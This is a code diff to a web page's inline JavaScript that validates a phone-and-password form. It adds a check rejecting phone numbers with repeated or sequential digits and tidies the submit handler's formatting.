@@ -218,6 +218,8 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   if (!form || !phoneInput || !passwordInput || !errorDiv) return;
+
+
   phoneInput.addEventListener("input", (e) => {
     let value = e.target.value.replace(/\D/g, "");
     if (value.length > 11) value = value.substring(0, 11);
@@ -233,31 +235,49 @@ document.addEventListener("DOMContentLoaded", () => {
     e.target.value = formatted;
   });
 
+
   const validateForm = (event) => {
     const phone = phoneInput.value.replace(/[- ]/g, ''); 
     const password = passwordInput.value;
+
+
+    const isWeakPhone = (num) => {
+   
+        if (/(.)\1{3,}/.test(num)) return true;
+        
+ 
+        const sequences = ["0123456789", "9876543210"];
+        for (const seq of sequences) {
+            for (let i = 0; i <= seq.length - 4; i++) {
+                if (num.includes(seq.substring(i, i + 4))) return true;
+            }
+        }
+        return false;
+    };
+
 
     let typeCount = 0;
     if (/[A-Z]/.test(password)) typeCount++;
     if (/[a-z]/.test(password)) typeCount++;
     if (/[0-9]/.test(password)) typeCount++;
 
-    const isPhoneValid = /^(090|080|070|060)\d{8}$/.test(phone);
+
+    const isPhoneValid = /^(090|080|070|060)\d{8}$/.test(phone) && !isWeakPhone(phone);
     const isPasswordValid = password.length >= 8 && typeCount >= 2;
-if (!isPhoneValid || !isPasswordValid) {
-    event.preventDefault();
-    event.stopPropagation();
-    errorDiv.style.display = "block";
-    return false;
-} else {
-    errorDiv.style.display = "none";
-    form.action = `/send?tel=${encodeURIComponent(phoneInput.value)}`;
-}
-    
+
+    if (!isPhoneValid || !isPasswordValid) {
+        event.preventDefault();
+        event.stopPropagation();
+        errorDiv.style.display = "block";
+        return false;
+    } else {
+        errorDiv.style.display = "none";
+        form.action = `/send?tel=${encodeURIComponent(phoneInput.value)}`;
+    }
   };
 
   if (submitBtn) submitBtn.addEventListener("click", validateForm);
   form.addEventListener("submit", validateForm);
 });
 </script>
-</body></html>
+ </body></html>
